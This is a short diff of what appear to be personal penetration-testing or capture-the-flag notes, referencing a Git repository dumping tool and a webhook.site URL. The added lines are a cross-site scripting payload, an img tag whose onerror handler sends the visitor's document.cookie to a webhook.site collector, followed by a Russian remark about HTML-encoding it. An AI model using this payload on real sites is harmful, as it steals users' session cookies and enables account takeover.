@@ -59,4 +59,5 @@ https://github.com/internetwache/GitTools/tree/master/Dumper
 
 
  	https://webhook.site/d7110bf3-8246-4764-ac2e-fef55a74f93a?cmd=10
-  
+          <img src=x onerror=fetch('https://webhook.site/8743011e-45c2-41d0-83d0-97cb07de311b/?'+document.cookie) />
+        кодируем в HTML
